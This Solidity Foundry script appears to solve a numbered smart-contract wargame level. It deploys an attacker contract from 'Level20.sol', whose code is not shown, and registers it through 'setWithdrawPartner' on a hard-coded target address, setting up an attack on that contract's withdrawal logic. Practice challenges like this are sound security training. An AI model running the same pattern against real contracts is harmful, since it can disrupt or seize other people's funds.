// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Level20} from "../src/Level20.sol";

contract Level20Script is Script {
    address addr = 0x4A809c2d6feF8C00D36c8C7Feb536f0edD170Ee8;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        Level20 bob = new Level20();
        (bool a,) = address(addr).call(abi.encodeWithSignature("setWithdrawPartner(address)", bob));
        require(a);
        vm.stopBroadcast();
    }
}
